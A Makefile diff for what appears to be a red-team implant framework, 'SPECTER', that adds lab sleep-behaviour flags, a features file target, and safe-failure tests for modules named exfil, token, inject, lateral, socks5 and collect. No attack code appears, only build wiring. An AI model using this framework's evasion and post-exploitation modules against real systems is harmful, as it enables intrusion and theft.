@@ -29,6 +29,22 @@ ifdef BAREBONE_MODULES
   BAREBONE_FLAGS += -DSPECTER_BAREBONE_MODULES
 endif
 
+ifdef CLEAN_SLEEP_ENTRY
+  BAREBONE_FLAGS += -DSPECTER_LAB_CLEAN_SLEEP_ENTRY
+endif
+
+ifdef BENIGN_SLEEP
+  BAREBONE_FLAGS += -DSPECTER_LAB_BENIGN_SLEEP
+endif
+
+ifdef OFFTHREAD_WAIT
+  BAREBONE_FLAGS += -DSPECTER_LAB_OFFTHREAD_WAIT
+endif
+
+ifdef CALLBACK_TICK
+  BAREBONE_FLAGS += -DSPECTER_LAB_CALLBACK_TICK
+endif
+
 CFLAGS  = -Wall -Werror -Wno-unused-function -Os -fno-stack-protector \
           -funwind-tables \
           -fno-ident -fpack-struct=8 -falign-functions=1 -falign-jumps=1 \
@@ -81,9 +97,16 @@ MOD_SRCS   = $(wildcard $(MOD_DIR)/*/$(notdir $(wildcard $(MOD_DIR)/*/*.c)))
 MOD_NAMES  = $(filter-out include,$(patsubst $(MOD_DIR)/%/,%,$(sort $(dir $(wildcard $(MOD_DIR)/*/*.c)))))
 MOD_BINS   = $(patsubst %,$(MOD_BUILD_DIR)/%.bin,$(MOD_NAMES))
 
-.PHONY: all clean size test modules modules-clean stubs stubs-clean pic-loader
+.PHONY: all clean size test modules modules-clean stubs stubs-clean pic-loader features
 
-all: $(TARGET_BIN) size
+all: $(TARGET_BIN) features size
+
+features:
+	@mkdir -p $(BUILD_DIR)
+	@printf "callback_tick=%s\n" "$(if $(CALLBACK_TICK),1,0)" > $(BUILD_DIR)/specter.features
+	@printf "barebone=%s\n" "$(if $(BAREBONE),1,0)" >> $(BUILD_DIR)/specter.features
+	@printf "barebone_modules=%s\n" "$(if $(BAREBONE_MODULES),1,0)" >> $(BUILD_DIR)/specter.features
+	@printf "dev=%s\n" "$(if $(DEV),1,0)" >> $(BUILD_DIR)/specter.features
 
 modules: $(MOD_BUILD_DIR) $(MOD_BINS)
 	@echo "=== Built $(words $(MOD_BINS)) module(s) ==="
@@ -163,6 +186,24 @@ $(TEST_BIN_DIR)/test_profile: $(TEST_DIR)/test_profile.c $(SRC_DIR)/profile.c $(
 $(TEST_BIN_DIR)/test_module_args: $(TEST_DIR)/test_module_args.c | $(TEST_BIN_DIR)
 	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
 
+$(TEST_BIN_DIR)/test_collect_safe_fail: $(TEST_DIR)/test_collect_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
+$(TEST_BIN_DIR)/test_socks5_safe_fail: $(TEST_DIR)/test_socks5_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
+$(TEST_BIN_DIR)/test_exfil_safe_fail: $(TEST_DIR)/test_exfil_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
+$(TEST_BIN_DIR)/test_token_safe_fail: $(TEST_DIR)/test_token_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
+$(TEST_BIN_DIR)/test_inject_safe_fail: $(TEST_DIR)/test_inject_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
+$(TEST_BIN_DIR)/test_lateral_safe_fail: $(TEST_DIR)/test_lateral_safe_fail.c | $(TEST_BIN_DIR)
+	$(TEST_CC) $(TEST_CFLAGS) -I$(MOD_DIR)/include -o $@ $^
+
 $(TEST_BIN_DIR)/test_beacon_shim: $(TEST_DIR)/test_beacon_shim.c $(BUS_DIR)/beacon_shim.c $(SRC_DIR)/string.c | $(TEST_BIN_DIR)
 	$(TEST_CC) $(TEST_CFLAGS) -Wno-unused-function -o $@ $^
 
@@ -181,7 +222,7 @@ $(TEST_BIN_DIR)/test_failover: $(TEST_DIR)/test_failover.c $(SRC_DIR)/comms.c $(
 $(TEST_BIN_DIR)/test_antianalysis: $(TEST_DIR)/test_antianalysis.c $(EVA_DIR)/antianalysis.c $(SRC_DIR)/string.c $(SRC_DIR)/hash.c | $(TEST_BIN_DIR)
 	$(TEST_CC) $(TEST_CFLAGS) -Wno-unused-function -o $@ $^
 
-test: $(TEST_BIN_DIR)/test_bus_api $(TEST_BIN_DIR)/test_ed25519 $(TEST_BIN_DIR)/test_coff_loader $(TEST_BIN_DIR)/test_lifecycle $(TEST_BIN_DIR)/test_profile $(TEST_BIN_DIR)/test_module_args $(TEST_BIN_DIR)/test_beacon_shim $(TEST_BIN_DIR)/test_extended_bof $(TEST_BIN_DIR)/test_channels $(TEST_BIN_DIR)/test_sleep $(TEST_BIN_DIR)/test_failover $(TEST_BIN_DIR)/test_antianalysis
+test: $(TEST_BIN_DIR)/test_bus_api $(TEST_BIN_DIR)/test_ed25519 $(TEST_BIN_DIR)/test_coff_loader $(TEST_BIN_DIR)/test_lifecycle $(TEST_BIN_DIR)/test_profile $(TEST_BIN_DIR)/test_module_args $(TEST_BIN_DIR)/test_collect_safe_fail $(TEST_BIN_DIR)/test_socks5_safe_fail $(TEST_BIN_DIR)/test_exfil_safe_fail $(TEST_BIN_DIR)/test_token_safe_fail $(TEST_BIN_DIR)/test_inject_safe_fail $(TEST_BIN_DIR)/test_lateral_safe_fail $(TEST_BIN_DIR)/test_beacon_shim $(TEST_BIN_DIR)/test_extended_bof $(TEST_BIN_DIR)/test_channels $(TEST_BIN_DIR)/test_sleep $(TEST_BIN_DIR)/test_failover $(TEST_BIN_DIR)/test_antianalysis
 	@echo "=== Running Bus API Tests ==="
 	@$(TEST_BIN_DIR)/test_bus_api
 	@echo "=== Running Ed25519 Tests ==="
@@ -194,6 +235,18 @@ test: $(TEST_BIN_DIR)/test_bus_api $(TEST_BIN_DIR)/test_ed25519 $(TEST_BIN_DIR)/
 	@$(TEST_BIN_DIR)/test_profile
 	@echo "=== Running Module Args Tests ==="
 	@$(TEST_BIN_DIR)/test_module_args
+	@echo "=== Running Collect Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_collect_safe_fail
+	@echo "=== Running SOCKS5 Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_socks5_safe_fail
+	@echo "=== Running Exfil Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_exfil_safe_fail
+	@echo "=== Running Token Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_token_safe_fail
+	@echo "=== Running Inject Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_inject_safe_fail
+	@echo "=== Running Lateral Safe-Failure Tests ==="
+	@$(TEST_BIN_DIR)/test_lateral_safe_fail
 	@echo "=== Running Beacon Shim Tests ==="
 	@$(TEST_BIN_DIR)/test_beacon_shim
 	@echo "=== Running Extended BOF API Tests ==="
